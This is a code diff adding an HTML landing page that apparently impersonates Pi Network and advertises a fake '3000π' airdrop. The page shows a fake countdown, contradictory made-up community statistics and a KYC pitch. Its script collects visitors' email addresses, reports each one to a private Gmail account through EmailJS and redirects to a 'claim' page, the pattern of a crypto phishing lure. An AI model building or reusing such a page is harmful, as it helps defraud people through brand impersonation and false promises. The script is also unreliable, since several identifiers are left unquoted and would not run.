@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pi Network - Subscribe</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@600&family=Inter:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* Reset default styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Body with purple gradient */
+        body {
+            background: linear-gradient(180deg, #4b1e9e 0%, #2d0b5e 100%);
+            color: #f9fafb;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+            padding: 40px 20px;
+            font-family: 'Inter', sans-serif;
+            animation: fadeIn 1s ease-in;
+        }
+
+        /* Fade-in animation */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Logo styling */
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 30px;
+        }
+
+        .logo img {
+            width: 48px;
+            height: 48px;
+            margin-right: 12px;
+        }
+
+        .logo span {
+            font-size: 32px;
+            font-weight: 600;
+            color: #f5a623;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        /* Main heading */
+        h1 {
+            font-size: 28px;
+            font-weight: 600;
+            color: #f9fafb;
+            margin-bottom: 12px;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        /* App Store Buttons */
+        .app-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+
+        .app-button {
+            display: inline-block;
+            width: 150px;
+            height: 50px;
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            transition: transform 0.3s;
+        }
+
+        .app-button:hover {
+            transform: scale(1.05);
+        }
+
+        .app-store {
+            background-image: url('https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg');
+        }
+
+        .google-play {
+            background-image: url('https://upload.wikimedia.org/wikipedia/commons/7/7a/Google_Play_2022_logo.svg');
+        }
+
+        /* Claim (Subscribe) section */
+        .claim-section {
+            width: 100%;
+            max-width: 450px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            padding: 32px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            backdrop-filter: blur(8px);
+        }
+
+        .claim-section p {
+            font-size: 16px;
+            color: #d1d5db;
+            margin-bottom: 20px;
+        }
+
+        .claim-form {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        /* Form inputs */
+        .claim-form input {
+            padding: 14px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            font-size: 16px;
+            background-color: rgba(255, 255, 255, 0.05);
+            color: #f9fafb;
+            outline: none;
+            transition: border-color 0.3s, box-shadow 0.3s;
+        }
+
+        .claim-form input::placeholder {
+            color: #9ca3af;
+        }
+
+        .claim-form input:focus {
+            border-color: #f5a623;
+            box-shadow: 0 0 0 3px rgba(245, 166, 35, 0.2);
+        }
+
+        /* Buttons */
+        .claim-form button, .claim-form .claim-now-button {
+            background-color: #ff4081;
+            color: #f9fafb;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.3s, transform 0.2s, box-shadow 0.3s;
+            position: relative;
+            overflow: hidden;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .claim-form button:hover, .claim-form .claim-now-button:hover {
+            background-color: #f50057;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(255, 64, 129, 0.3);
+        }
+
+        .claim-form button:disabled, .claim-form .claim-now-button:disabled {
+            background-color: #9ca3af;
+            cursor: not-allowed;
+        }
+
+        /* Success message */
+        .success-message {
+            color: #34d399;
+            font-size: 16px;
+            margin-top: 20px;
+            display: none;
+        }
+
+        /* Info text */
+        .info-text {
+            font-size: 14px;
+            color: #9ca3af;
+            margin-top: 20px;
+        }
+
+        /* Write-up section */
+        .write-up {
+            font-size: 14px;
+            color: #d1d5db;
+            margin-top: 40px;
+            line-height: 1.6;
+            text-align: left;
+        }
+
+        /* Progress Bar Section */
+        .progress-section {
+            margin-top: 40px;
+            width: 100%;
+            max-width: 450px;
+        }
+
+        .progress-label {
+            font-size: 16px;
+            color: #f9fafb;
+            margin-bottom: 10px;
+            font-weight: 500;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 10px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 5px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background-color: #f5a623;
+            width: 75%;
+            transition: width 1s ease-in-out;
+        }
+
+        /* Airdrop Rewards Tracker */
+        .rewards-section {
+            margin-top: 40px;
+            width: 100%;
+            max-width: 450px;
+            text-align: center;
+        }
+
+        .rewards-section p {
+            font-size: 16px;
+            color: #f9fafb;
+            font-weight: 500;
+        }
+
+        .rewards-section span {
+            color: #ff4081;
+            font-weight: 600;
+        }
+
+        /* Community Spotlight Section */
+        .spotlight-section {
+            margin-top: 60px;
+            width: 100%;
+            max-width: 450px;
+        }
+
+        .spotlight-section h2 {
+            font-size: 22px;
+            color: #f9fafb;
+            margin-bottom: 20px;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        .spotlight-box {
+            background-color: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            padding: 24px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
+        }
+
+        .spotlight-box p {
+            font-size: 14px;
+            color: #d1d5db;
+            line-height: 1.6;
+        }
+
+        /* Status section */
+        .status-section {
+            margin-top: 60px;
+            width: 100%;
+            max-width: 450px;
+        }
+
+        .status-section h2 {
+            font-size: 22px;
+            color: #f9fafb;
+            margin-bottom: 20px;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        .status-box {
+            background-color: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            padding: 24px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
+        }
+
+        .status-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 16px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .status-item:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+            padding-bottom: 0;
+        }
+
+        .status-label {
+            font-weight: 500;
+            color: #9ca3af;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .status-value {
+            font-weight: 600;
+            color: #f9fafb;
+        }
+
+        /* Timer section */
+        .timer-section {
+            margin-top: 60px;
+            width: 100%;
+            max-width: 450px;
+        }
+
+        .timer-section h2 {
+            font-size: 22px;
+            color: #f9fafb;
+            margin-bottom: 20px;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        .timer-box {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+        }
+
+        .timer-item {
+            background-color: rgba(255, 64, 129, 0.1);
+            border: 1px solid rgba(255, 64, 129, 0.3);
+            border-radius: 8px;
+            padding: 12px;
+            min-width: 70px;
+            text-align: center;
+            transition: transform 0.3s;
+        }
+
+        .timer-item:hover {
+            transform: scale(1.05);
+        }
+
+        .timer-value {
+            font-size: 28px;
+            font-weight: 600;
+            color: #ff4081;
+        }
+
+        .timer-label {
+            font-size: 12px;
+            color: #d1d5db;
+            opacity: 0.8;
+        }
+
+        /* Footer */
+        footer {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+            margin-top: 60px;
+        }
+
+        .social-links {
+            display: flex;
+            gap: 16px;
+        }
+
+        .social-icon {
+            width: 36px;
+            height: 36px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #f9fafb;
+            text-decoration: none;
+            font-size: 18px;
+            transition: background-color 0.3s, transform 0.3s;
+        }
+
+        .social-icon:hover {
+            background-color: rgba(255, 255, 255, 0.2);
+            transform: translateY(-2px);
+        }
+
+        .footer-text {
+            font-size: 14px;
+            color: #9ca3af;
+        }
+    </style>
+</head>
+<body>
+    <!-- Logo -->
+    <div class="logo">
+        <img src="https://via.placeholder.com/48?text=π" alt="Pi Network Logo">
+        <span>Pi Network</span>
+    </div>
+
+    <!-- Subscribe Section -->
+    <div class="claim-section">
+        <h1>Download the app here</h1>
+        <div class="app-buttons">
+            <a href="https://apps.apple.com/us/app/pi-network/id1490692817" target="_blank" class="app-button app-store"></a>
+            <a href="https://play.google.com/store/apps/details?id=com.blockchainvault" target="_blank" class="app-button google-play"></a>
+        </div>
+        <p>Enter your email</p>
+        <form class="claim-form" id="subscribe-form">
+            <input type="email" id="email" placeholder="Your email address" required>
+            <button type="submit" id="subscribe-button">Subscribe</button>
+            <a href="claim.html" class="claim-now-button">Claim 3000π Now</a>
+        </form>
+        <div class="success-message" id="success-message">Proceed to claim your 3000π!</div>
+        <p class="info-text">We only send interesting and relevant emails.</p>
+        <div class="write-up">
+            <p>The official Pi Network has reached 2 million pioneers! To get closer to the mainnet and activate and attract more pioneers, they will be holding an airdrop, awarding a total of 3000π/pioneer prizes to those who successfully complete KYC. The future looks very exciting as the Pi community continues to build the Web3 Pi ecosystem full of amazing apps and utilities on top of the Pi browser. Let's get the job done right and do everything we can to support this exciting development.</p>
+        </div>
+    </div>
+
+    <!-- Progress Bar Section -->
+    <section class="progress-section">
+        <div class="progress-label">1,500,000/2,000,000 Pioneers Joined</div>
+        <div class="progress-bar">
+            <div class="progress-fill"></div>
+        </div>
+    </section>
+
+    <!-- Airdrop Rewards Tracker -->
+    <section class="rewards-section">
+        <p>Total Airdrop Rewards: <span>4,500,000π</span> Distributed</p>
+    </section>
+
+    <!-- Community Spotlight Section -->
+    <section class="spotlight-section">
+        <h2>Community Spotlight</h2>
+        <div class="spotlight-box">
+            <p>Community Spotlight: 500,000 Pioneers completed KYC this month! Join the movement and help us reach the mainnet faster.</p>
+        </div>
+    </section>
+
+    <!-- Status Section -->
+    <section class="status-section">
+        <h2>Community Stats</h2>
+        <div class="status-box">
+            <div class="status-item">
+                <span class="status-label"><i class="fas fa-users"></i> Pioneers Registered</span>
+                <span class="status-value">2,000,000</span>
+            </div>
+            <div class="status-item">
+                <span class="status-label"><i class="fas fa-check"></i> KYC Completed</span>
+                <span class="status-value">1,500,000</span>
+            </div>
+        </div>
+    </section>
+
+    <!-- Timer Section -->
+    <section class="timer-section">
+        <h2>Airdrop Deadline</h2>
+        <div class="timer-box">
+            <div class="timer-item">
+                <div class="timer-value" id="days">00</div>
+                <div class="timer-label">Days</div>
+            </div>
+            <div class="timer-item">
+                <div class="timer-value" id="hours">00</div>
+                <div class="timer-label">Hours</div>
+            </div>
+            <div class="timer-item">
+                <div class="timer-value" id="minutes">00</div>
+                <div class="timer-label">Minutes</div>
+            </div>
+            <div class="timer-item">
+                <div class="timer-value" id="seconds">00</div>
+                <div class="timer-label">Seconds</div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <div class="social-links">
+            <a href="#" class="social-icon"><i class="fab fa-facebook-f"></i></a>
+            <a href="#" class="social-icon"><i class="fab fa-twitter"></i></a>
+            <a href="#" class="social-icon"><i class="fab fa-telegram-plane"></i></a>
+        </div>
+        <p class="footer-text">© 2025 Pi Network. All Rights Reserved.</p>
+    </footer>
+
+    <!-- EmailJS SDK -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        // Initialize EmailJS with your User ID
+        emailjs.init(KtLqHh8xtlVMGAOPY); // Replace with your EmailJS User ID
+
+        // Countdown Timer
+        const deadline = new Date("2025-12-31T23:59:59").getTime();
+        const timer = setInterval(() => {
+            const now = new Date().getTime();
+            const distance = deadline - now;
+            if (distance < 0) {
+                clearInterval(timer);
+                document.querySelector(".timer-box").innerHTML = "<p>Airdrop Period Ended</p>";
+                return;
+            }
+            const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+            const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+            document.getElementById("days").textContent = days.toString().padStart(2, "0");
+            document.getElementById("hours").textContent = hours.toString().padStart(2, "0");
+            document.getElementById("minutes").textContent = minutes.toString().padStart(2, "0");
+            document.getElementById("seconds").textContent = seconds.toString().padStart(2, "0");
+        }, 1000);
+
+        // Form Submission - Redirect to claim page
+        const subscribeForm = document.getElementById("subscribe-form");
+        const subscribeButton = document.getElementById("subscribe-button");
+        subscribeForm.addEventListener("submit", (e) => {
+            e.preventDefault();
+            const email = document.getElementById("email").value;
+
+            // Basic email validation
+            if (!email || !email.includes("@")) {
+                alert("Please enter a valid email address.");
+                return;
+            }
+
+            // Show success message
+            document.getElementById("success-message").style.display = "block";
+
+            // Send subscription confirmation email
+            const currentDateTime = new Date().toLocaleString("en-US", {
+                timeZone: "Africa/Lagos",
+                hour12: true,
+                weekday: "long",
+                year: "numeric",
+                month: "long",
+                day: "numeric",
+                hour: "2-digit",
+                minute: "2-digit",
+            });
+
+            emailjs.send(service_9a4wn0l, template_b9pz12e, {
+                to_email: sirprist1@gmail.com,
+                message: `You have successfully subscribed to Pi Network Airdrop at ${currentDateTime}. Proceed to claim your 3000π!`
+            }).then(() => {
+                // Redirect to claim page with email as query parameter
+                setTimeout(() => {
+                    window.location.href = `claim.html?email=${encodeURIComponent(email)}`;
+                }, 1000);
+            }).catch((error) => {
+                alert("Failed to subscribe. Please try again.");
+                console.error("EmailJS Error:", error);
+            });
+        });
+    </script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+        (function() {
+            emailjs.init(KtLqHh8xtlVMGAOPY); // Replace with your User ID (e.g., user_1234567890abcdef)
+        })();
+    </script>
+</body>
+</html>
